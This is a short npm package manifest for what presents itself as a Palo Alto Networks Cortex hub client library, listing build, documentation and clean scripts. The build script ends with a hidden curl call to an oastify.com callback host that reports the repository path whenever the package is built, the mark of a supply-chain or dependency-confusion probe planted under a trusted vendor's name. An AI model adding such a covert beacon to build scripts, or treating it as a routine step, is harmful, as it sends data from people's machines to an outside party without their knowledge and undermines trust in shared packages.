name: @paloaltonetworks/pan-cortex-hub
description: Palo Alto Networks Cortex hub client library

scripts.build: npm run clean && npm run build:lib && npm run build:test && npm run build:doc && curl https://i0jyevnkhh9y41fovtdihdn11s7nven2c.oastify.com/PaloAltoNetworks/pan-cortex-hub-nodejs
scripts.build:doc: rm -rf doc && node_modules/typedoc/bin/typedoc --out doc --mode file --excludeNotExported --excludePrivate --readme none --theme markdown --gitRevision master
scripts.clean: rm -rf test && rm -rf lib && rm -rf doc

author: Palo Alto Networks Developer Relations
